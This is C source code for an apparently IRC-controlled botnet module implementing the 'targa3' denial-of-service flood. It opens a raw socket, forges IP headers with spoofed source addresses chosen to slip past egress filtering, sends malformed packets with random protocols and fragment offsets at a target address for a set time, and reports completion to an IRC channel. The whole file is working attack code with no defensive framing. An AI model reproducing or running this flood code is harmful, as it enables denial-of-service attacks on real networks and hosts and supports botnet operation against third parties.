#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_TARGA3

DWORD WINAPI Targa3Thread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	TARGA3 tga3 = *((TARGA3 *)param);
	TARGA3 *tga3s = (TARGA3 *)param;
	tga3s->gotinfo = TRUE;

	sprintf(sendbuf, "-\x03\x34\2targa3\2\x03- Done with flood.", Targa3(finet_addr(tga3.ip), atoi(tga3.length)));
	if (!tga3.silent) irc_privmsg(tga3.sock, tga3.chan, sendbuf, tga3.notice); 
	addlog(sendbuf);

	clearthread(tga3.threadnum);

	ExitThread(0); 
}

int Targa3(unsigned long TargetIP, int time)
{
  sockaddr_in sin;
  unsigned long start;
  SOCKET sock;
  struct iph ip;
  char *packet;
  BOOL flag = TRUE;
  int packet_size = 512;
  int proto[14] = {	0, 1, 2, 4, 6, 8, 12, 17, 22, 41, 58, 255, 0 };
  int frags[10] = { 0, 0, 0, 8192, 0x4, 0x6, 16383, 1, 0 };
  struct hostent *he;
  char *host = new char[256];

  fgethostname(host, 256);
  he = fgethostbyname (host);
  DWORD spoof = *(PDWORD)he->h_addr_list[0]; 
  sock = fsocket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  fsetsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag));
  packet = (char*)malloc(packet_size);
  start = GetTickCount();
  sin.sin_addr.s_addr = TargetIP;
  sin.sin_family = AF_INET;
  sin.sin_port = fhtons(666);
  while (((GetTickCount() - start)/1000) <= (unsigned int)time)
  {
    //spoof from an IP on our own class C subnet to bypass egress filtering routers..
	spoof &= 0x00FFFFFF; 
	spoof |= (rand() % 0xFF) << 24; 
	proto[13] = rand() % 255;
	frags[9] = rand() % 8100;
	ip.ihl = 5;
	ip.version = 4;
	ip.tos = 4;
	ip.id = rand();
	ip.frag_off = fhtons(frags[rand() % 10]);
	ip.tot_len = fhtons(packet_size);
	ip.ttl = 255;
	ip.protocol = proto[rand() % 14];
	ip.saddr = spoof;
	ip.daddr = TargetIP;
	ip.check = checksum((unsigned short*)&ip, sizeof(struct iph));
	memcpy(packet, &ip, sizeof(ip));
	fsendto(sock, (const char*)packet, packet_size, 0, (struct sockaddr *)&sin, sizeof(sin));
  }
  free(packet);
  fclosesocket(sock);
  return 1;
}
#endif